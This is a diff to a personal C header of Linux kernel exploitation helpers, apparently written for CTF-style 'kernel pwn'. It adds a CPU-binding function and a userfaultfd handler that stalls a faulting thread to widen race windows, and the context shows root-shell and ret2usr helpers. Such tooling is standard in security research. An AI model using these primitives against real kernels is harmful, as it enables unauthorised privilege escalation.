@@ -1,13 +1,16 @@
 /**
  * @file kernel.h
  * @author arttnba3 (arttnba@gmail.com)
- * @brief arttnba3's personla utils for kernel pwn
+ * @brief arttnba3's personal utils for kernel pwn
  * @version 1.0
  * @date 2023-02-05
  * 
  * @copyright Copyright (c) 2023 arttnba3
  * 
  */
+#ifndef A3_KERNEL_PWN_H
+#define A3_KERNEL_PWN_H
+
 #define _GNU_SOURCE
 #include <sys/types.h>
 #include <stdio.h>
@@ -37,7 +40,7 @@
 
 /**
  * I - fundamental functions
- * e.g. function to check and pop a root shell, user-status saver, etc.
+ * e.g. CPU-core binder, user-status saver, etc.
  */
 
 size_t kernel_base = 0xffffffff81000000, kernel_offset = 0;
@@ -50,9 +53,7 @@ void errExit(char *msg)
 
 /* root checker and shell poper */
 void getRootShell(void)
-{   
-    puts("\033[32m\033[1m[+] Backing from the kernelspace.\033[0m");
-
+{
     if(getuid()) {
         puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
         exit(EXIT_FAILURE);
@@ -78,6 +79,18 @@ void saveStatus()
             "pop user_rflags;"
             );
     printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
+}
+
+/* bind the process to specific core */
+void bindCore(int core)
+{
+    cpu_set_t cpu_set;
+
+    CPU_ZERO(&cpu_set);
+    CPU_SET(core, &cpu_set);
+    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
+
+    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
 }
 
 /* ret2usr attacker */
@@ -569,9 +582,10 @@ size_t ldtSeekingMemory(void *(*ldt_momdifier)(void*, size_t),
 
 #include <linux/userfaultfd.h>
 
-static pthread_t monitor_thread;
+char temp_page_for_stuck[0x1000];
 
-void registerUserFaultFd(void *addr, unsigned long len, void *(*handler)(void*))
+void registerUserFaultFd(pthread_t *monitor_thread, void *addr,
+                        unsigned long len, void *(*handler)(void*))
 {
     long uffd;
     struct uffdio_api uffdio_api;
@@ -594,9 +608,64 @@ void registerUserFaultFd(void *addr, unsigned long len, void *(*handler)(void*))
     if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
         errExit("ioctl-UFFDIO_REGISTER");
 
-    s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);
+    s = pthread_create(monitor_thread, NULL, handler, (void *) uffd);
     if (s != 0)
         errExit("pthread_create");
+}
+
+void *uffdHandlerForStuckingThread(void *args)
+{
+    struct uffd_msg msg;
+    int fault_cnt = 0;
+    long uffd;
+
+    struct uffdio_copy uffdio_copy;
+    ssize_t nread;
+
+    uffd = (long) args;
+
+    for (;;) 
+    {
+        struct pollfd pollfd;
+        int nready;
+        pollfd.fd = uffd;
+        pollfd.events = POLLIN;
+        nready = poll(&pollfd, 1, -1);
+
+        if (nready == -1)
+            errExit("poll");
+
+        nread = read(uffd, &msg, sizeof(msg));
+
+        /* just stuck there is okay... */
+        sleep(100000000);
+
+        if (nread == 0)
+            errExit("EOF on userfaultfd!\n");
+
+        if (nread == -1)
+            errExit("read");
+
+        if (msg.event != UFFD_EVENT_PAGEFAULT)
+            errExit("Unexpected event on userfaultfd\n");
+
+        uffdio_copy.src = (unsigned long long) temp_page_for_stuck;
+        uffdio_copy.dst = (unsigned long long) msg.arg.pagefault.address &
+                                                    ~(0x1000 - 1);
+        uffdio_copy.len = 0x1000;
+        uffdio_copy.mode = 0;
+        uffdio_copy.copy = 0;
+        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
+            errExit("ioctl-UFFDIO_COPY");
+
+        return NULL;
+    }
+}
+
+void registerUserFaultFdForThreadStucking(pthread_t *monitor_thread, 
+                                          void *buf, unsigned long len)
+{
+    registerUserFaultFd(monitor_thread, buf, len, uffdHandlerForStuckingThread);
 }
 
 #endif
@@ -657,3 +726,5 @@ struct tty_operations {
 #endif
     const struct file_operations *proc_fops;
 };
+
+#endif
